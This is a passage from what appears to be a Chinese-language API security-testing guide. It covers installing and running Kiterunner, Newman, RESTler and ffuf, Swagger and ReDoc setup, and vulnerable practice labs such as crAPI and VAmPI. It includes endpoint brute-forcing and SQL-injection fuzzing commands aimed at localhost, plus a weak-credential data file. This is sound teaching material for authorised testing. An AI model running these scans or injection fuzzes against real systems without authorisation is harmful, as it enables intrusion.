git clone https://github.com/assetnote/kiterunner.git
cd kiterunner
make build

# 复制到系统路径
sudo ln -s $(pwd)/dist/kr /usr/local/bin/kr

# 验证安装
kr --help

# 预期输出：
# _  ___  _ _
# | |/ (_)| | |
# | ' / _| | |_ ___ _ __ _   _ _ __
# |  < | | | __/ _ \ '__| | | | '_ \
# | . \| | | ||  __/ |  | |_| | | | |
# |_|\_\_|_|\__\___|_|   \__,_|_| |_|
# 
# Usage:
#   kr [command]
# 
# Available Commands:
#   help        Help about any command
#   brute       API brute forcing mode
#   scan        API scanning mode
#   ...
```

#### 【Linux环境】API扫描

```bash
# 操作位置：终端
# 基本扫描
kr scan http://localhost:8888 -w ~/.kiterunner/routes/common.kite

# 扫描并指定深度
kr scan http://localhost:8888 -w routes.kite -x 2

# 使用多个wordlist
kr scan http://localhost:8888 -w routes1.kite,routes2.kite

# 预期输出：
# Scanning http://localhost:8888 with 10000 routes...
# 
# 200 GET  /api/v1/users
# 200 GET  /api/v1/products
# 401 GET  /api/v1/admin
# 200 POST /api/v1/auth/login
# ...
# 
# Results: 25 endpoints discovered
```

#### 【Linux环境】API模糊测试

```bash
# 操作位置：终端
# 暴力测试API参数
kr brute http://localhost:8888/api/v1/users

# 使用自定义payload
kr brute http://localhost:8888/api/v1/users -w payloads.txt
```

### 28.5.3 Postman Runner

#### 【通用】使用Postman Collection Runner

```
操作位置：Postman
# 步骤：
# 1. 打开Collections
# 2. 选择要运行的集合
# 3. 点击 "Run"
# 4. 配置运行参数：
#    - Iterations: 迭代次数
#    - Delay: 请求间隔
#    - Data: 数据文件（CSV/JSON）
# 5. 点击 "Run <collection name>"
# 6. 查看运行结果
```

### 28.5.4 Newman CLI工具

#### 【Linux环境】高级用法

```bash
# 操作位置：终端
# 设置迭代次数
newman run collection.json -n 10

# 使用数据驱动测试
newman run collection.json -d data.csv

# data.csv示例：
# username,password
# admin,admin123
# test,test123
# user,user123

# 设置延迟
newman run collection.json --delay-request 1000

# 失败停止
newman run collection.json --bail

# 详细输出
newman run collection.json -v
```

#### 【Linux环境】集成到CI/CD

```yaml
# .gitlab-ci.yml 示例
stages:
  - test

api_test:
  stage: test
  image: node:16
  before_script:
    - npm install -g newman newman-reporter-junit
  script:
    - newman run collection.json -e environment.json -r junit,cli
  artifacts:
    reports:
      junit: newman/newman-run-report-*.xml
    when: always
```

### 28.5.5 RESTler模糊测试

RESTler是微软发布的REST API模糊测试工具。

#### 【Linux环境】安装

```bash
# 操作位置：Linux终端
# 安装.NET SDK
wget https://dot.net/v1/dotnet-install.sh
chmod +x dotnet-install.sh
./dotnet-install.sh --channel 7.0

# 克隆RESTler
git clone https://github.com/microsoft/restler-fuzzer.git
cd restler-fuzzer

# 编译
./build.sh

# 验证
./restler/Restler --version
```

#### 【Linux环境】使用方法

```bash
# 操作位置：终端
# 步骤1：编译OpenAPI规范
dotnet RESTler.dll compile --api_spec openapi.json --output_dir output

# 步骤2：生成测试
dotnet RESTler.dll generate --grammar_file output/grammar.py --output_dir output

# 步骤3：运行模糊测试
dotnet RESTler.dll fuzz --grammar_file output/grammar.py --time_budget 1 --output_dir output
```

### 28.5.6 API Fuzz测试

#### 【Linux环境】ffuf模糊测试

```bash
# 操作位置：Kali Linux终端
# 安装ffuf
sudo apt install -y ffuf

# 目录模糊测试
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost:8888/api/v1/FUZZ

# 参数模糊测试
ffuf -w /usr/share/wordlists/wfuzz/Injections/SQL.txt \
  -u 'http://localhost:8888/api/v1/user?id=FUZZ' \
  -H 'Content-Type: application/json'

# 预期输出：
#         /'___\  /'___\           /'___\
#        /\ \__/ /\ \__/  __  __  /\ \__/
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
#          \ \_\   \ \_\  \ \____/  \ \_\
#           \/_/    \/_/   \/___/    \/_/
# 
#        v2.0.0
# ________________________________________________
# 
#  :: Method           : GET
#  :: URL              : http://localhost:8888/api/v1/FUZZ
#  :: Wordlist         : common.txt
# :: Follow redirects : false
# :: Calibration      : false
# :: Timeout          : 10
# :: Threads          : 40
# :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
# ________________________________________________
# 
# users                   [Status: 200, Size: 1234, Words: 100, Lines: 20]
# products                [Status: 200, Size: 5678, Words: 200, Lines: 50]
# admin                   [Status: 401, Size: 100, Words: 10, Lines: 5]
```

### 28.5.7 常见问题

**Q: Nuclei扫描速度太慢怎么办？**

A: 优化方法：
1. 使用 `-rate-limit` 调整速率
2. 使用 `-c` 调整并发数
3. 只运行相关模板（使用 -tags 或 -t）
4. 使用批量输入文件

**Q: Kiterunner的wordlist在哪里下载？**

```bash
# 操作位置：终端
# 下载官方wordlist
git clone https://github.com/assetnote/wordlists.git

# 或从AssetNode下载
wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite
```

---

## 28.6 API文档工具

API文档是API开发和测试的重要组成部分。

### 28.6.1 Swagger / OpenAPI

OpenAPI规范（原Swagger）是最流行的API描述格式。

#### 【通用】OpenAPI规范简介

OpenAPI规范定义了REST API的标准接口描述语言，包括：
- 可用端点（/users, /products等）
- 每个端点的操作（GET, POST, PUT, DELETE等）
- 操作参数（输入输出）
- 认证方式
- 联系信息、许可证等

#### 【Linux环境】Swagger Editor安装

```bash
# 操作位置：终端
# Docker运行Swagger Editor
docker run -d -p 8081:8080 --name swagger-editor swaggerapi/swagger-editor

# 预期输出：
# Unable to find image 'swaggerapi/swagger-editor:latest' locally
# latest: Pulling from swaggerapi/swagger-editor
# ...
# Status: Downloaded newer image for swaggerapi/swagger-editor:latest
# <container_id>

# 访问地址
# http://localhost:8081
```

#### 【通用】在线使用

```
操作位置：浏览器
# Swagger Editor在线版
https://editor.swagger.io/

# 使用方法：
# 1. 左侧编辑YAML/JSON格式的API描述
# 2. 右侧实时预览
# 3. File > Import File 可以导入现有的规范
# 4. File > Save as YAML/JSON 导出
```

### 28.6.2 ReDoc

ReDoc是另一个流行的OpenAPI文档生成工具。

#### 【Docker】Docker安装

```bash
# 操作位置：终端
# Docker运行ReDoc
docker run -d -p 8082:80 \
  -e SPEC_URL=https://petstore.swagger.io/v2/swagger.json \
  --name redoc redocly/redoc

# 预期输出：
# Unable to find image 'redocly/redoc:latest' locally
# ...
# Status: Downloaded newer image for redocly/redoc:latest
# <container_id>

# 访问地址
# http://localhost:8082
```

#### 【通用】基本使用

```html
<!-- 使用CDN嵌入ReDoc -->
<!DOCTYPE html>
<html>
<head>
    <title>API Documentation</title>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,700|Roboto:300,400,700" rel="stylesheet">
    <style>
        body { margin: 0; padding: 0; }
        redoc { display: block; }
    </style>
</head>
<body>
    <redoc spec-url='http://petstore.swagger.io/v2/swagger.json'></redoc>
    <script src="https://cdn.jsdelivr.net/npm/redoc@latest/bundles/redoc.standalone.js"></script>
</body>
</html>
```

### 28.6.3 Swagger UI Docker部署

Swagger UI是最常用的OpenAPI文档可视化工具。

#### 【Docker】快速部署

```bash
# 操作位置：终端
# 方式一：使用在线API规范
docker run -d -p 8083:8080 \
  -e SWAGGER_JSON_URL=https://petstore.swagger.io/v2/swagger.json \
  --name swagger-ui swaggerapi/swagger-ui

# 方式二：使用本地文件
docker run -d -p 8083:8080 \
  -v /path/to/swagger.json:/usr/share/nginx/html/swagger.json \
  -e SWAGGER_JSON=/usr/share/nginx/html/swagger.json \
  --name swagger-ui swaggerapi/swagger-ui

# 预期输出：
# Unable to find image 'swaggerapi/swagger-ui:latest' locally
# ...
# Status: Downloaded newer image for swaggerapi/swagger-ui:latest
# <container_id>

# 访问地址
# http://localhost:8083
```

#### 【Docker】Docker Compose方式

```yaml
# docker-compose.yml
version: '3'
services:
  swagger-ui:
    image: swaggerapi/swagger-ui
    ports:
      - "8083:8080"
    environment:
      - SWAGGER_JSON_URL=https://petstore.swagger.io/v2/swagger.json
      - URLS_PRIMARY_NAME=Pet Store
    restart: unless-stopped
```

```bash
# 启动
docker-compose up -d
```

#### 【通用】使用Swagger UI测试API

```
操作位置：Swagger UI (http://localhost:8083)
# 测试API步骤：
# 1. 找到要测试的端点
# 2. 点击 "Try it out"
# 3. 填写参数（如果有）
# 4. 点击 "Execute"
# 5. 查看响应结果
# 
# 常用功能：
# - Servers: 选择API服务器
# - Authorize: 设置认证信息
# - Schemas: 查看数据模型
```

### 28.6.4 Postman文档生成

#### 【通用】从集合生成文档

```
操作位置：Postman
# 步骤：
# 1. 选择一个Collection
# 2. 点击 "View complete documentation"
# 3. 查看自动生成的文档
# 4. 点击 "Publish" 发布文档
# 
# 文档内容包括：
# - 所有请求列表
# - 请求方法和URL
# - 请求头和请求体
# - 响应示例
# - 测试脚本
```

#### 【通用】文档分享

```
操作位置：Postman
# 分享文档：
# 1. Collection > Share
# 2. 选择 "Via API" 或 "Via Run in Postman"
# 3. 获取分享链接
# 4. 可以嵌入到网站
```

### 28.6.5 常见问题

**Q: Swagger UI加载不了本地文件怎么办？**

A: 可能是CORS问题：
1. 使用Docker挂载本地文件方式
2. 配置API服务器添加CORS头
3. 使用本地HTTP服务器托管JSON文件

**Q: OpenAPI规范文件怎么获取？**

A: 获取方法：
1. 查找API文档（通常在 /swagger.json, /openapi.json, /api-docs）
2. 使用浏览器开发者工具网络面板查找
3. 使用目录扫描工具发现
4. 从Postman Collection转换

---

## 28.7 API漏洞练习平台

本节介绍专门的API漏洞练习平台，用于提升API安全测试技能。

### 28.7.1 OWASP API Security Top 10靶场

#### 【Docker】crAPI完整练习

crAPI是最完整的OWASP API Security Top 10练习平台。

```bash
# 操作位置：终端
# 启动crAPI
docker run -d -p 8888:8888 --name crapi owasp/crapi:latest

# 或使用完整版本
git clone https://github.com/OWASP/crAPI.git
cd crAPI/deploy/docker
docker-compose up -d
```

#### 【通用】漏洞练习清单

| 漏洞类型 | 端点 | 难度 |
|----------|------|------|
| API1 - BOLA | /identity/api/v2/user/{id} | 简单 |
| API1 - BOLA | /workshop/api/mechanic/{id} | 中等 |
| API2 - 认证失效 | /identity/api/v2/user/forgot-password | 中等 |
| API3 - 过度数据暴露 | /community/api/v2/community/posts/recent | 简单 |
| API4 - 资源耗尽 | /identity/api/v2/user/otp | 中等 |
| API5 - BFLA | /workshop/api/admin/users | 困难 |
| API6 - SSRF | /workshop/api/merchant/contact_mechanic | 中等 |
| API7 - 安全配置错误 | /identity/api/auth | 简单 |
| API8 - 不当库存管理 | /identity/api/v2/admin | 中等 |
| API9 - 资产管理不当 | /v1/user/{id} | 简单 |
| API10 - API消费 | /workshop/api/shop/orders | 困难 |

### 28.7.2 PortSwigger Academy API

PortSwigger Web Security Academy提供了丰富的API安全练习。

#### 【通用】访问地址

```
操作位置：浏览器
# 官方网站
https://portswigger.net/web-security/api-testing

# 主题包括：
# - API testing
# - GraphQL API vulnerabilities
# - REST API testing
# - Authentication vulnerabilities
# - Access control vulnerabilities
```

#### 【通用】练习内容

```
PortSwigger Academy API相关实验：
1. API testing path
   - Finding and exploiting API endpoints
   - Testing for mass assignment
   - Server-side request forgery (SSRF) via APIs
   - Testing API authentication

2. GraphQL path
   - Finding GraphQL endpoints
   - GraphQL introspection
   - Access control vulnerabilities
   - CSRF via GraphQL
   - Bypassing GraphQL restrictions

3. REST API experiments
   - JWT attacks
   - OAuth authentication
   - CORS vulnerabilities
```

### 28.7.3 API Pentesting Lab

#### 【Docker】VAmPI - Vulnerable API

```bash
# 操作位置：终端
# 克隆仓库
git clone https://github.com/erev0s/VAmPI.git
cd VAmPI

# Docker方式
docker build -t vampi .
docker run -d -p 5000:5000 --name vampi vampi

# 预期输出：
# Sending build context to Docker daemon
# Step 1/10 : FROM python:3.8-alpine
# ...
# Status: Downloaded newer image for python:3.8-alpine
# <container_id>

# 访问地址
# http://localhost:5000
```

#### 【通用】VAmPI漏洞列表

```
VAmPI包含的漏洞：
1. SQL Injection
2. NoSQL Injection
3. Broken Authentication
4. Sensitive Data Exposure
5. Broken Access Control
6. Mass Assignment
7. CORS Misconfiguration
8. API Rate Limiting Issues
9. JWT Weaknesses
10. Open Redirect
```

### 28.7.4 API vulnerabilities playground

#### 【Docker】NodeGoat

NodeGoat是一个Node.js编写的漏洞应用，包含API漏洞。

```bash
# 操作位置：终端
# Docker运行
docker run -d -p 4000:4000 --name nodegoat owasp/nodegoat

# 预期输出：
# Unable to find image 'owasp/nodegoat:latest' locally
# ...
# Status: Downloaded newer image for owasp/nodegoat:latest
# <container_id>

# 访问地址
# http://localhost:4000
```

#### 【Docker】WebGoat API部分

WebGoat也包含API安全相关的练习。

```bash
# 操作位置：终端
# Docker运行
docker run -d -p 8080:8080 --name webgoat webgoat/webgoat:latest

# 访问地址
# http://localhost:8080/WebGoat
```

### 28.7.5 综合练习平台对比

| 平台 | 难度 | 漏洞数量 | Docker支持 | 适合人群 |
|------|------|----------|------------|----------|
| crAPI | 中等 | 10+ | ✅ | 初学者-中级 |
| DVGA | 中等 | 10+ | ✅ | GraphQL学习者 |
| vAPI | 简单 | 10+ | ✅ | 初学者 |
| VAmPI | 中等 | 10+ | ✅ | 中级 |
| PortSwigger | 从易到难 | 30+ | ❌ | 各级别 |
| NodeGoat | 中等 | 10+ | ✅ | Node.js开发者 |
| WebGoat | 简单-中等 | 10+ | ✅ | 初学者 |

### 28.7.6 常见问题

**Q: 练习平台启动后怎么开始？**

A: 建议的学习路径：
1. 先了解OWASP API Security Top 10
2. 从简单漏洞开始练习（BOLA、信息泄露）
3. 逐步挑战更难的漏洞
4. 尝试使用不同的工具（Burp、Postman、curl）
5. 做完后查看官方解决方案

**Q: 没有Docker环境怎么练习？**

A: 替代方案：
1. 使用在线平台（PortSwigger Academy）
2. 本地手动安装（需要Node.js、Python等运行时）
3. 使用云服务器部署
4. 使用Vagrant虚拟机
